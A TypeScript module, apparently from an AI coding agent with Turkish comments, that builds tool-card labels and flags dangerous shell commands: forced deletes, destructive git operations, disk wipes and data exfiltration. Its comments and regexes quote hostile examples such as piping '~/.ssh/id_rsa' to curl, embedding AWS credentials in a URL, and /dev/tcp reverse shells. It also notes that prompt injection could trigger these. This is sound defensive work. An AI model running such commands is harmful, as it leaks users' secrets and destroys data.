import { dirname, isAbsolute, join } from "node:path";
import type { ToolKind } from "@codezal/contracts";
import { dict, type Locale } from "@codezal/i18n";
import { ADVISOR_TOOL } from "./advisor.js";
import { EXPLORE_AGENT } from "./agents/profile.js";
import { AGENT_LIST_TOOL, AGENT_MESSAGE_TOOL, AGENT_STOP_TOOL } from "./agents/run-tools.js";
import { AGENT_TOOL } from "./agents/tool.js";
import {
  AUDIT_HUNT_TOOL,
  AUDIT_RECORD_TOOL,
  AUDIT_REPORT_TOOL,
  AUDIT_START_TOOL,
  AUDIT_STATUS_TOOL,
  AUDIT_VERIFY_TOOL,
} from "./audit/tools.js";
import { BACKGROUND_TOOL } from "./background.js";
import { DOCX_TOOL } from "./docx-create.js";
import { DOCX_EDIT_TOOL } from "./docx-edit-tool.js";
import { MCP_TOOL_PREFIX, TOOL_SEARCH_TOOL } from "./mcp.js";
import { PDF_TOOL } from "./pdf-create.js";
import { defaultPdfEditName, PDF_EDIT_ACTIONS } from "./pdf-edit.js";
import { PDF_EDIT_TOOL } from "./pdf-edit-tool.js";
import { PLAN_ENTER_TOOL, PLAN_EXIT_TOOL } from "./plan-tools.js";
import { QUESTION_TOOL } from "./question-tool.js";
import { SCHEDULE_TOOL } from "./schedule-tool.js";
import { TASK_LIST_TOOL } from "./task-list.js";
import { XLSX_TOOL } from "./xlsx-create.js";
import { XLSX_EDIT_TOOL } from "./xlsx-edit-tool.js";

export interface ToolPresentation {
  kind: ToolKind;
  title: string;
  target?: string;
  command?: string;
}

/** Araç kartındaki hedef satırı tek satırdır; uzun metin burada kırpılır. */
const CARD_TARGET_CHARS = 120;

function str(v: unknown): string | undefined {
  return typeof v === "string" && v.length > 0 ? v : undefined;
}

/** Bash komutunun silme içerip içermediğini kaba biçimde tespit eder. */
export function looksLikeDelete(command: string): boolean {
  return /\b(rm|rmdir|unlink|git\s+rm|del)\b/.test(command);
}

/**
 * Kabuk komutunu parçalara ve kelimelere ayırır. Tam bir kabuk ayrıştırıcısı değildir; amaç
 * tehlikeli kalıbı gizleyen yaygın sarmalamaları açmaktır: tırnaklar kelimeden atılır, `\rm`
 * kaçışı çözülür, `;` `&` `|` `(` `)` ters tırnak ve satır sonu parçayı böler. Böylece `(rm -rf x)`,
 * `$(rm -rf x)`, `a && rm -rf x` ayrı parçalarda komut konumuna düşer.
 */
function splitSegments(command: string): string[][] {
  const segments: string[][] = [];
  let words: string[] = [];
  let word = "";
  let inWord = false;
  let quote: string | undefined;
  const endWord = () => {
    if (inWord) words.push(word);
    word = "";
    inWord = false;
  };
  const endSegment = () => {
    endWord();
    if (words.length > 0) segments.push(words);
    words = [];
  };
  for (let i = 0; i < command.length; i++) {
    const c = command.charAt(i);
    if (quote) {
      if (c === quote) quote = undefined;
      else if (c === "\\" && quote === '"' && i + 1 < command.length) word += command.charAt(++i);
      else word += c;
      continue;
    }
    if (c === "'" || c === '"') {
      quote = c;
      inWord = true;
    } else if (c === "\\") {
      if (i + 1 < command.length) word += command.charAt(++i);
      inWord = true;
    } else if (c === "\n") endSegment();
    else if (/\s/.test(c)) endWord();
    else if (";&|()`".includes(c)) endSegment();
    else {
      word += c;
      inWord = true;
    }
  }
  endSegment();
  return segments;
}

/** Çift tırnak içindeki `$(…)` ve ters tırnaklı komut ikamesi de çalışır; içerikleri döner. */
function substitutions(word: string): string[] {
  const out: string[] = [];
  for (const m of word.matchAll(/\$\(([^()]*)\)|`([^`]*)`/g)) {
    const inner = m[1] ?? m[2];
    if (inner) out.push(inner);
  }
  return out;
}

/**
 * Asıl komuttan önce gelen ve onu değiştirmeyen sarmalayıcılar (`sudo rm -rf` hâlâ `rm`dir).
 * Değer, sarmalayıcının **değer alan** seçenekleridir: `sudo -u root rm` içinde `root` komut değil.
 */
const WRAPPERS = new Map<string, ReadonlySet<string>>([
  ["sudo", new Set(["-u", "-g", "-p", "-C", "-D", "-R", "-T", "-U", "-h"])],
  ["doas", new Set(["-u", "-C"])],
  ["env", new Set(["-u", "-S", "-C"])],
  ["nice", new Set(["-n"])],
  ["xargs", new Set(["-I", "-n", "-P", "-L", "-d", "-E", "-s", "-a"])],
  ...["command", "builtin", "exec", "nohup", "time"].map(
    (w) => [w, new Set<string>()] as [string, ReadonlySet<string>],
  ),
  // Kabuk anahtar kelimeleri: `if rm -rf x; then …`, `{ rm -rf x; }`.
  ...["if", "elif", "while", "until", "then", "do", "else", "{", "}", "!"].map(
    (w) => [w, new Set<string>()] as [string, ReadonlySet<string>],
  ),
]);

function stripWrappers(words: readonly string[]): string[] {
  let i = 0;
  while (i < words.length) {
    const w = words[i] ?? "";
    const valued = WRAPPERS.get(w);
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(w)) i++;
    else if (valued) {
      i++;
      // Sarmalayıcının kendi bayrakları (`sudo -E`, `env -i`, `xargs -0`) komut değildir.
      while ((words[i] ?? "").startsWith("-")) i += valued.has(words[i] ?? "") ? 2 : 1;
    } else break;
  }
  return words.slice(i);
}

/** `/bin/rm` → `rm`; Windows yolu da (`C:\…\git.exe`) aynı biçimde kısalır. */
function commandName(word: string): string {
  const base = word.split(/[\\/]/).pop() ?? word;
  return base.toLowerCase().replace(/\.exe$/, "");
}

const SHELLS = new Set(["sh", "bash", "zsh", "dash", "ksh", "fish"]);
const POWERSHELLS = new Set(["powershell", "pwsh"]);
/** PowerShell ve cmd silme komutları (takma adlar dahil); `rm` de PowerShell'de takma addır. */
const REMOVERS = new Set(["rm", "remove-item", "ri", "del", "erase", "rd", "rmdir"]);

/**
 * Silme çağrısı hem özyinelemeli hem zorlayıcı mı? Bayraklar ayrı (`rm -r -f`), uzun
 * (`--recursive --force`), hedeften sonra (`rm x -rf`) ya da PowerShell (`-Recurse -Force`) ve cmd
 * (`/s /q`) biçiminde yazılabilir. `--` ayracından sonrası hedeftir, bayrak aranmaz.
 */
function isRecursiveForceRemove(name: string, args: readonly string[]): boolean {
  let recursive = false;
  let force = false;
  for (const arg of args) {
    if (arg === "--") break;
    const lower = arg.toLowerCase();
    if (lower === "--recursive" || /^-rec(u(r(s(e)?)?)?)?$/.test(lower)) recursive = true;
    else if (lower === "--force" || /^-fo(r(c(e)?)?)?$/.test(lower)) force = true;
    else if (/^-[a-zA-Z]+$/.test(arg) && name === "rm") {
      if (/[rR]/.test(arg)) recursive = true;
      if (arg.includes("f")) force = true;
    } else if (name !== "rm" && name !== "remove-item" && name !== "ri") {
      // cmd.exe: `del /s /q`, `rd /s /q`.
      if (lower === "/s") recursive = true;
      else if (lower === "/q") force = true;
    }
  }
  return recursive && force;
}

/** Global git seçeneklerini (`-C yol`, `-c a=b`, `--no-pager`) atlayıp alt komutu bulur. */
function gitSubcommand(args: readonly string[]): { sub: string; rest: string[] } | undefined {
  let i = 0;
  while (i < args.length) {
    const a = args[i] ?? "";
    if (a === "-C" || a === "-c" || a === "--git-dir" || a === "--work-tree") i += 2;
    else if (a.startsWith("-")) i++;
    else return { sub: a, rest: args.slice(i + 1) };
  }
  return undefined;
}

/** Geri alınamayan git işlemleri: uzak geçmişi ezen push, çalışma ağacını ya da dalı silenler. */
function isDangerousGit(args: readonly string[]): boolean {
  const parsed = gitSubcommand(args);
  if (!parsed) return false;
  const { sub, rest } = parsed;
  const shortFlags = rest.filter((a) => /^-[a-zA-Z]+$/.test(a)).join("");
  switch (sub) {
    case "push":
      // `--force-with-lease` daha güvenli ama yine uzak geçmişi yeniden yazar: uyarı kalır.
      // `+main` refspec'i ve `:main` (uzak dalı silme) da aynı etkidedir.
      return (
        shortFlags.includes("f") ||
        shortFlags.includes("d") ||
        rest.some(
          (a) =>
            a.startsWith("--force") ||
            a === "--delete" ||
            a === "--mirror" ||
            a === "--prune" ||
            /^\+./.test(a) ||
            /^:[^:]/.test(a),
        )
      );
    case "reset":
      return rest.includes("--hard");
    case "clean":
      // `git clean -d -f` de yıkıcıdır: izlenmeyen dosyaları (yeni işleri) siler.
      return shortFlags.includes("f") || rest.includes("--force");
    case "checkout":
      // `git checkout -- dosya` ve `git checkout .` kaydedilmemiş değişikliği atar.
      return (
        rest.includes("--") ||
        rest.includes(".") ||
        shortFlags.includes("f") ||
        rest.includes("--force")
      );
    case "restore": {
      // Yalnız hazırlık alanını boşaltan `--staged` çalışma ağacına dokunmaz; gerisi değişikliği atar.
      const staged = rest.includes("--staged") || shortFlags.includes("S");
      const worktree = rest.includes("--worktree") || shortFlags.includes("W");
      return !staged || worktree;
    }
    case "branch":
      return (
        shortFlags.includes("D") ||
        ((shortFlags.includes("d") || rest.includes("--delete")) &&
          (shortFlags.includes("f") || rest.includes("--force")))
      );
    case "stash":
      return rest[0] === "clear" || rest[0] === "drop";
    default:
      return false;
  }
}

/** Parçaların iç içe açılma sınırı (`bash -c "sh -c '…'"`); sonsuz özyinelemeye karşı. */
const MAX_DEPTH = 4;

function isDangerousSegment(words: readonly string[], depth: number): boolean {
  for (const w of words)
    for (const inner of substitutions(w)) if (isDangerousAt(inner, depth + 1)) return true;
  const [head, ...args] = stripWrappers(words);
  if (!head) return false;
  const name = commandName(head);
  if (SHELLS.has(name)) {
    // `bash -c "rm -rf x"`, `sh -lc '…'`: -c'den sonraki argüman ayrı bir komut satırıdır.
    const c = args.findIndex((a) => /^-[a-zA-Z]*c[a-zA-Z]*$/.test(a));
    const script = c >= 0 ? args[c + 1] : undefined;
    return script ? isDangerousAt(script, depth + 1) : false;
  }
  if (POWERSHELLS.has(name)) {
    const c = args.findIndex((a) => /^-c(ommand)?$/i.test(a));
    return c >= 0 ? isDangerousAt(args.slice(c + 1).join(" "), depth + 1) : false;
  }
  if (name === "eval") return isDangerousAt(args.join(" "), depth + 1);
  if (REMOVERS.has(name)) return isRecursiveForceRemove(name, args);
  if (name === "git") return isDangerousGit(args);
  if (name === "find") {
    if (args.includes("-delete")) return true;
    // `find . -exec rm -rf {} \;`: -exec'ten sonrası kendi başına bir komuttur.
    // `find … -exec rm {} +` de `-delete` gibi toplu siler; bayrak aranmaz.
    const exec = args.findIndex((a) => a === "-exec" || a === "-execdir" || a === "-ok");
    if (exec < 0) return false;
    const [sub] = stripWrappers(args.slice(exec + 1));
    if (sub && REMOVERS.has(commandName(sub))) return true;
    return isDangerousSegment(args.slice(exec + 1), depth + 1);
  }
  return false;
}

function isDangerousAt(command: string, depth: number): boolean {
  if (depth > MAX_DEPTH) return false;
  return splitSegments(command).some((words) => isDangerousSegment(words, depth));
}

/**
 * Tehlikeli komut kalıpları: her modda uyarı gösterilir (PRD §6). Komut kaba biçimde ayrıştırılır;
 * düz metin taraması `bash -c "rm -rf x"`, `\rm -rf x`, `$(rm -rf x)` ya da `sudo rm -rf` gibi
 * yazımları kaçırıyordu. Tırnak içindeki yazı (`echo "rm -rf"`) komut konumunda olmadığı için
 * uyarı üretmez.
 */
/**
 * Veri kaçırma kalıpları (legacy `dangerous-bash.ts`): yerel veriyi ağ aracına aktaran ya da dosya
 * içeriğini yükleyen komutlar. Okunan bir sayfaya gizlenmiş talimat bunları tetikleyebilir;
 * tehlikeli sayılınca her modda sorulur, gözetimsiz görevde reddedilir.
 */
const EXFIL_PATTERNS: readonly RegExp[] = [
  // Çıktıyı ağ aracına borula: `cat ~/.ssh/id_rsa | curl -d @- …`
  /\|\s*(?:curl|wget|nc|ncat|netcat|socat)\b/,
  // Dosya içeriğini gövde olarak gönder: `-d @dosya`, `--data-binary @dosya`, `-T dosya`.
  /\b(?:curl|wget)\b[^|;&\n]*(?:--upload-file\b|\s-T\s|\s--?(?:d|data|data-binary|data-raw|data-urlencode|json)\s*[= ]?\s*['"]?@)/,
  // Çok parçalı form ile dosya yükleme: `-F file=@yol`, `--form a=<yol`.
  /\b(?:curl|wget)\b[^|;&\n]*\s(?:-F|--form)\s*['"]?[^\s=]*=[@<]/,
  /\bwget\b[^|;&\n]*--post-file\b/,
  // Komut çıktısını adrese göm: `curl "https://x/?k=$(cat ~/.aws/credentials)"`.
  /\b(?:curl|wget)\b[^;&\n]*(?:\$\(|`)/,
  // Ham soket: ters kabuk ve sızdırma.
  /\/dev\/(?:tcp|udp)\//,
];

export function isDangerousCommand(command: string): boolean {
  return (
    isDangerousAt(command, 0) ||
    EXFIL_PATTERNS.some((re) => re.test(command)) ||
    /\b(mkfs(\.\w+)?|shutdown|reboot)\b/.test(command) ||
    // Eski desen `dd\s+if=\b` idi: `=` ile `/` arasında sözcük sınırı olmadığı için hiç eşleşmiyordu.
    /\bdd\s+(?:[^\n;&|]*\s)?(?:if|of)=/.test(command) ||
    /\bchmod\s+-R\s+777\b/.test(command)
  );
}

/** Onay kartında gösterilen istem kırpması; kartın tamamını istem metni kaplamasın. */
const CARD_PROMPT_CHARS = 280;

/**
 * `schedule_task` onay kartının ayrıntısı. Görev kullanıcı yokken, verilmezse **tam erişimle**
 * çalışır; yalnız başlığı gören kullanıcı neyi hangi izinle onayladığını bilmiyordu. Kart bu yüzden
 * izni (varsayılan olduğunu da belirterek) ve istemin kısaltılmış hâlini gösterir.
 */
function scheduleDetail(args: Record<string, unknown>, lang: Locale): string | undefined {
  const action = str(args.action);
  if (action !== "create" && action !== "update") return undefined;
  const d = dict(lang);
  const lines: string[] = [];
  const title = str(args.title);
  if (title) lines.push(title);
  const permission = str(args.permission);
  const known = (p: string | undefined): p is keyof typeof d.permissionMode =>
    p !== undefined && p in d.permissionMode;
  if (known(permission)) {
    lines.push(d.agent.tool.schedulePermission.replace("{{mode}}", d.permissionMode[permission]));
  } else if (action === "create") {
    // Kayıt varsayılanı `schedule-tool.ts` ile aynı: izin verilmezse "full".
    lines.push(d.agent.tool.schedulePermissionDefault.replace("{{mode}}", d.permissionMode.full));
  }
  // Web izni kartta açıkça görünür: kullanıcı onayladığı anda gözetimsiz web erişimini de verir.
  if (args.allowWeb === true) lines.push(d.agent.tool.scheduleWeb);
  const prompt = str(args.prompt)?.replace(/\s+/g, " ").trim();
  if (prompt) {
    const clipped =
      prompt.length > CARD_PROMPT_CHARS ? `${prompt.slice(0, CARD_PROMPT_CHARS)}…` : prompt;
    lines.push(d.agent.tool.schedulePrompt.replace("{{prompt}}", clipped));
  }
  return lines.length > 0 ? lines.join("\n") : undefined;
}

/** Pi araç adı ve argümanlarından tasarımdaki kart türünü ve başlığını türetir. */
export function describeTool(
  toolName: string,
  args: Record<string, unknown>,
  lang: Locale = "tr",
): ToolPresentation {
  const d = dict(lang);
  const path = str(args.path);
  switch (toolName) {
    case "read": {
      // PDF içinde arama kartta "Arandı" olarak görünür: terim ve dosya birlikte.
      const search = str(args.search)?.trim();
      if (search) {
        const target = path ? `${search} · ${path.split(/[\\/]/).pop()}` : search;
        return { kind: "search", title: d.agent.tool.search, target };
      }
      return { kind: "read", title: d.agent.tool.read, ...(path ? { target: path } : {}) };
    }
    case "grep":
    case "find":
    case "ls": {
      const pattern = str(args.pattern);
      const target = pattern ?? path;
      return { kind: "search", title: d.agent.tool.search, ...(target ? { target } : {}) };
    }
    case "write":
      return { kind: "create", title: d.agent.tool.create, ...(path ? { target: path } : {}) };
    case "edit":
      return { kind: "edit", title: d.agent.tool.edit, ...(path ? { target: path } : {}) };
    case PDF_TOOL:
      // Oluşturma kartı: Çıktılar kutusu ve tur dosya listesi `create` türünü toplar.
      return { kind: "create", title: d.agent.tool.pdf, ...(path ? { target: path } : {}) };
    case PDF_EDIT_TOOL: {
      const action = PDF_EDIT_ACTIONS.find((a) => a === args.action) ?? "rotate";
      if (action === "list_fields") {
        return { kind: "read", title: d.agent.tool.pdfFields, ...(path ? { target: path } : {}) };
      }
      const title = d.agent.tool.pdfEdit;
      if (!path) return { kind: "create", title };
      // Girdi değişmez, sonuç yeni dosyadır (belge kartı). Dolu ad yüzünden seçilen `-2` gibi
      // kesin yol sonuçtaki `details.path` ile sonradan gelir.
      const output = str(args.output)?.trim();
      if (!output) return { kind: "create", title, target: defaultPdfEditName(path, action) };
      const bare = output.replace(/\.pdf$/i, "");
      const named = action === "split" ? `${bare}-1.pdf` : `${bare}.pdf`;
      const target =
        !isAbsolute(named) && !named.startsWith("~") ? join(dirname(path), named) : named;
      // Kullanıcı açıkça girdinin üzerine yazdırıyorsa yerinde düzenleme kartı.
      return { kind: target === path ? "edit" : "create", title, target };
    }
    case DOCX_TOOL:
      return { kind: "create", title: d.agent.tool.docx, ...(path ? { target: path } : {}) };
    case DOCX_EDIT_TOOL: {
      // `output` yeni dosyadır (belge kartı), yoksa yerinde düzenleme. Göreli `output` kaynağın
      // klasörüne göre çözülür; sonuçtaki `details.path` kesin yolu sonradan taşır.
      const output = str(args.output);
      if (!output) {
        return { kind: "edit", title: d.agent.tool.docxEdit, ...(path ? { target: path } : {}) };
      }
      const named = /\.(docx|docm)$/i.test(output) ? output : `${output}.docx`;
      const target =
        path && !isAbsolute(named) && !named.startsWith("~") ? join(dirname(path), named) : named;
      return { kind: "create", title: d.agent.tool.docxEdit, target };
    }
    case XLSX_TOOL:
      return { kind: "create", title: d.agent.tool.xlsx, ...(path ? { target: path } : {}) };
    case XLSX_EDIT_TOOL: {
      const output = str(args.output);
      if (!output) {
        return { kind: "edit", title: d.agent.tool.xlsxEdit, ...(path ? { target: path } : {}) };
      }
      const ext = path && /\.xlsm$/i.test(path) ? ".xlsm" : ".xlsx";
      const named = /\.(xlsx|xlsm)$/i.test(output) ? output : `${output}${ext}`;
      const target =
        path && !isAbsolute(named) && !named.startsWith("~") ? join(dirname(path), named) : named;
      return { kind: "create", title: d.agent.tool.xlsxEdit, target };
    }
    case "web_search": {
      const query = str(args.query);
      return { kind: "search", title: d.agent.tool.webSearch, ...(query ? { target: query } : {}) };
    }
    case TASK_LIST_TOOL:
      // Kart fiili diğer satırlarla aynı kalıpta; araç etiketi (`tasks`) yalın kalır.
      return { kind: "other", title: d.agent.tool.tasksCard };
    case PLAN_ENTER_TOOL:
      return { kind: "other", title: d.agent.tool.planEnter };
    case PLAN_EXIT_TOOL:
      return { kind: "other", title: d.agent.tool.planExit };
    case QUESTION_TOOL: {
      // Kartta ilk soru hedef olur; uzun soru keşif aracıyla aynı desende kırpılır.
      const list = Array.isArray(args.questions) ? args.questions : [];
      const first = list[0];
      const raw =
        first && typeof first === "object" ? (first as { question?: unknown }).question : undefined;
      const text = str(raw);
      const target =
        text && text.length > CARD_TARGET_CHARS ? `${text.slice(0, CARD_TARGET_CHARS)}…` : text;
      return { kind: "other", title: d.agent.tool.question, ...(target ? { target } : {}) };
    }
    case BACKGROUND_TOOL: {
      // `start` terminal kartıdır (komut görünür, tehlikeli kalıp uyarısı çalışır); diğerleri bilgi.
      const command = str(args.command);
      if (args.action === "start" && command)
        return { kind: "terminal", title: d.agent.tool.backgroundStart, command };
      const id = str(args.id) ?? str(args.action);
      return { kind: "other", title: d.agent.tool.background, ...(id ? { target: id } : {}) };
    }
    case AUDIT_START_TOOL: {
      const profile = str(args.profile) ?? "standard";
      const scope = Array.isArray(args.scope_paths) ? args.scope_paths.length : 0;
      return {
        kind: "audit",
        title: d.agent.tool.auditStart,
        target: scope > 0 ? `${profile} · ${scope}` : profile,
      };
    }
    case AUDIT_HUNT_TOOL:
    case AUDIT_VERIFY_TOOL:
    case AUDIT_RECORD_TOOL: {
      const key =
        toolName === AUDIT_HUNT_TOOL
          ? "units"
          : toolName === AUDIT_VERIFY_TOOL
            ? "candidates"
            : "candidates";
      const list = Array.isArray(args[key]) ? (args[key] as unknown[]) : [];
      // Tek hedefte kimliğin kendisi, çoklu hedefte "6 birim" gibi okunur bir etiket gösterilir.
      const countLabel =
        toolName === AUDIT_HUNT_TOOL
          ? d.agent.tool.auditUnitCount
          : d.agent.tool.auditCandidateCount;
      return {
        kind: "audit",
        title:
          toolName === AUDIT_HUNT_TOOL
            ? d.agent.tool.auditHunt
            : toolName === AUDIT_VERIFY_TOOL
              ? d.agent.tool.auditVerify
              : d.agent.tool.auditRecord,
        ...(list.length > 0
          ? {
              target:
                list.length === 1
                  ? String(list[0])
                  : countLabel.replace("{{count}}", String(list.length)),
            }
          : {}),
      };
    }
    case AUDIT_STATUS_TOOL:
      return { kind: "audit", title: d.agent.tool.auditStatus };
    case AUDIT_REPORT_TOOL:
      return { kind: "audit", title: d.agent.tool.auditReport };
    case AGENT_TOOL: {
      const agentType = str(args.subagent_type);
      const description = str(args.description);
      if (agentType === EXPLORE_AGENT) {
        // Keşif kartında görevin kendisi hedef olur; başlık tek satır olduğu için sadeleştirilip
        // kırpılır.
        const prompt = (description ?? str(args.prompt))?.replace(/\s+/g, " ").trim();
        const target =
          prompt && prompt.length > CARD_TARGET_CHARS
            ? `${prompt.slice(0, CARD_TARGET_CHARS)}…`
            : prompt;
        return { kind: "search", title: d.agent.tool.explore, ...(target ? { target } : {}) };
      }
      // Alt ajan devri: hedef "ajan adı · kısa görev adı"; ikisi de yoksa kart yalın kalır.
      const target =
        agentType && description ? `${agentType} · ${description}` : (agentType ?? description);
      return { kind: "other", title: d.agent.tool.agent, ...(target ? { target } : {}) };
    }
    case AGENT_LIST_TOOL:
      return { kind: "other", title: d.agent.tool.agentList };
    case AGENT_MESSAGE_TOOL:
    case AGENT_STOP_TOOL: {
      const id = str(args.run_id);
      return {
        kind: "other",
        title: toolName === AGENT_STOP_TOOL ? d.agent.tool.agentStop : d.agent.tool.agentMessage,
        ...(id ? { target: id } : {}),
      };
    }
    case TOOL_SEARCH_TOOL: {
      const query = str(args.query);
      return {
        kind: "search",
        title: d.agent.tool.toolSearch,
        ...(query ? { target: query } : {}),
      };
    }
    case SCHEDULE_TOOL: {
      const title = str(args.title);
      const detail = scheduleDetail(args, lang);
      return {
        kind: "other",
        title: d.agent.tool.schedule,
        ...(title ? { target: title } : {}),
        ...(detail ? { command: detail } : {}),
      };
    }
    case ADVISOR_TOOL:
      return { kind: "other", title: d.agent.tool.advisor };
    case "web_fetch": {
      const url = str(args.url);
      return { kind: "read", title: d.agent.tool.webFetch, ...(url ? { target: url } : {}) };
    }
    case "bash":
    case "powershell": {
      const command = str(args.command) ?? "";
      const kind: ToolKind = looksLikeDelete(command) ? "delete" : "terminal";
      return {
        kind,
        title: kind === "delete" ? d.agent.tool.delete : d.agent.tool.terminal,
        command,
      };
    }
    default:
      // Bağlayıcı araçları: `mcp_<bağlayıcı>_<araç>`; kartta bağlayıcı başlığı ve araç adı görünür.
      if (toolName.startsWith(MCP_TOOL_PREFIX))
        return {
          kind: "other",
          title: d.agent.tool.mcp,
          target: toolName.slice(MCP_TOOL_PREFIX.length),
        };
      return { kind: "other", title: toolName };
  }
}
